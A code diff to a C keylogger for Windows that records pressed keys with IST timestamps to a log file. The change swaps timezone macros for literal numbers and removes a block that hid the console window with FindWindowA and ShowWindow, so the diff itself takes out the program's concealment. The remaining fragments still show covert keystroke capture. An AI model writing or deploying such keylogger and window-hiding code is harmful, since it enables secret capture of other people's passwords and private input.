@@ -1,9 +1,7 @@
 #include<stdio.h>														//for input/output operations
-#include<time.h>														//use to define time functions					
-#include<windows.h>														//contains declarations of all functions of windows API		
+#include<time.h>														//use to define time functions
+#include<windows.h>						
 #include<stdlib.h>	                                                  	//defines variable types and various macros
-#define PST1 (5)														//macro for pacific standard time for hours
-#define PST2 (30)														//macro for pacific standard time for minutes
 
 FILE *ptr,*f1,*f2;														//file pointer																		
 int day();																// function declarations
@@ -44,13 +42,13 @@ int ti()																            // to calculate at which time the key is pre
     struct tm *ptr_ts;																//structure tm is created to store time variables
     time ( &raw_time );																//pre-defined time function
     ptr_ts = gmtime ( &raw_time );											
-	if((ptr_ts->tm_min+PST2)>=60)													//checks for minutes in IST
+	if((ptr_ts->tm_min+30)>=60)													//checks for minutes in IST
 		{                
-			fprintf (ptr,"(%2d:%02d:%02d)\n",ptr_ts->tm_hour+PST1+1, ptr_ts->tm_min+PST2-60, ptr_ts->tm_sec);	
+			fprintf (ptr,"(%2d:%02d:%02d)\n",ptr_ts->tm_hour+5+1, ptr_ts->tm_min+30-60, ptr_ts->tm_sec);	
 		}	
-	 else if((ptr_ts->tm_min+PST2)<60)
+	 else if((ptr_ts->tm_min+30)<60)
 		{                
-			fprintf (ptr,"(%2d:%02d:%02d)\n",ptr_ts->tm_hour+PST1, ptr_ts->tm_min+PST2, ptr_ts->tm_sec);
+			fprintf (ptr,"(%2d:%02d:%02d)\n",ptr_ts->tm_hour+5, ptr_ts->tm_min+30, ptr_ts->tm_sec);
 		}		
  return 0;
 }
@@ -195,11 +193,6 @@ else if(key==45)
 int main()						
 {
     char i;
- 
-	HWND stealth;														//declaring window handle
-	AllocConsole();													//pre-defined function that allocates new console to calling process 	
-	stealth = FindWindowA("ConsoleWindowClass",NULL);						//find the console window with class name
-	ShowWindow(stealth,0);												//function to hide window
 	
 	time_t endwait;
     time_t start = time(NULL);
@@ -222,5 +215,5 @@ int main()
               Save(i,"LOG.TXT");									//Save function is called 
 	        }
 	    }
-	}											
+	}										
 }
